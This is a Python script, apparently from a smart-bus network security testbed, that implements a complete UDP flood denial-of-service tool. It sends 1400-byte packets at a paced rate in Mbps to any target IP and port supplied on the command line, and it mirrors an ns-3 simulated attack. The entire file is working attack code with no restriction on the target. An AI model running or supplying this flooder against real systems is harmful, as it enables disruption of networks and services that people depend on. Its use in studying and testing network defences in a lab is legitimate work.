#!/usr/bin/env python3
"""
Al-Ahsa Smart Bus — DDoS attack script.

Floods a target with 1400-byte UDP packets at a configurable rate,
replicating the ns-3 OnOffHelper DDoS attack in smart-bus.cc
(lines 1671-1692).

Default rate: 30 Mbps  (ddosRate = 30e6 in ns-3)
Default port: 5000     (TELEMETRY_PORT)

Usage:
    python ddos_attack.py --target 192.168.1.100 --rate 30
    python ddos_attack.py --target 192.168.1.100 --rate 30 --duration 60 --port 5000
"""

import argparse
import logging
import signal
import socket
import struct
import sys
import time

logger = logging.getLogger(__name__)

# Matches ns-3 OnOffHelper PacketSize=1400 (smart-bus.cc line 1684)
PACKET_SIZE = 1400

# Reporting interval (seconds)
REPORT_INTERVAL = 2.0


def build_packet(size: int) -> bytes:
    """Build a payload of *size* bytes filled with a recognizable pattern.

    The first 4 bytes are a marker so it is easy to identify DDoS traffic
    in packet captures (0xDEADBEEF).
    """
    marker = struct.pack("<I", 0xDEADBEEF)
    if size <= len(marker):
        return marker[:size]
    return marker + b"\x00" * (size - len(marker))


def run_attack(target: str, port: int, rate_mbps: float,
               duration: float | None) -> None:
    """Send UDP flood at the specified rate until stopped."""

    rate_bps = rate_mbps * 1e6
    bits_per_packet = PACKET_SIZE * 8
    packets_per_second = rate_bps / bits_per_packet

    if packets_per_second <= 0:
        logger.error("Computed packets/sec <= 0 — check --rate argument")
        return

    interval = 1.0 / packets_per_second
    payload = build_packet(PACKET_SIZE)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Graceful shutdown
    running = True

    def _signal_handler(signum, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    logger.info(
        "DDoS attack starting -> %s:%d  rate=%.1f Mbps  pps=%.0f  pkt=%dB",
        target, port, rate_mbps, packets_per_second, PACKET_SIZE,
    )
    if duration:
        logger.info("Duration: %.1f seconds", duration)
    else:
        logger.info("Duration: until Ctrl+C")

    start_time = time.monotonic()
    total_sent = 0
    total_bytes = 0
    report_time = start_time + REPORT_INTERVAL
    report_bytes = 0

    try:
        while running:
            now = time.monotonic()

            # Duration limit
            if duration and (now - start_time) >= duration:
                break

            # Send one packet
            try:
                sock.sendto(payload, (target, port))
                total_sent += 1
                total_bytes += PACKET_SIZE
                report_bytes += PACKET_SIZE
            except OSError as exc:
                logger.warning("Send error: %s", exc)

            # Live throughput report
            if now >= report_time:
                elapsed_report = now - (report_time - REPORT_INTERVAL)
                if elapsed_report > 0:
                    mbps = (report_bytes * 8) / elapsed_report / 1e6
                else:
                    mbps = 0.0
                elapsed_total = now - start_time
                print(
                    f"[{elapsed_total:7.1f}s]  sent={total_sent}  "
                    f"throughput={mbps:.2f} Mbps  "
                    f"total={total_bytes / 1e6:.2f} MB"
                )
                report_bytes = 0
                report_time = now + REPORT_INTERVAL

            # Pace to target rate using busy-wait for precision
            expected_time = start_time + total_sent * interval
            sleep_time = expected_time - time.monotonic()
            if sleep_time > 0.001:
                time.sleep(sleep_time - 0.0005)
            # Busy-wait the remainder for sub-millisecond accuracy
            while time.monotonic() < expected_time:
                pass

    finally:
        sock.close()
        elapsed = time.monotonic() - start_time
        if elapsed > 0:
            avg_mbps = (total_bytes * 8) / elapsed / 1e6
        else:
            avg_mbps = 0.0
        print(
            f"\nDDoS attack finished.  "
            f"Sent {total_sent} packets ({total_bytes / 1e6:.2f} MB) "
            f"in {elapsed:.1f}s  avg={avg_mbps:.2f} Mbps"
        )


def main():
    parser = argparse.ArgumentParser(
        description="Al-Ahsa Smart Bus — DDoS UDP flood attack"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target IP address"
    )
    parser.add_argument(
        "--rate", type=float, default=30.0,
        help="Attack rate in Mbps (default: 30, matching ns-3 ddosRate=30e6)"
    )
    parser.add_argument(
        "--duration", type=float, default=None,
        help="Attack duration in seconds (default: until Ctrl+C)"
    )
    parser.add_argument(
        "--port", type=int, default=5000,
        help="Target UDP port (default: 5000 = TELEMETRY_PORT)"
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true",
        help="Enable debug logging"
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    run_attack(args.target, args.port, args.rate, args.duration)


if __name__ == "__main__":
    main()
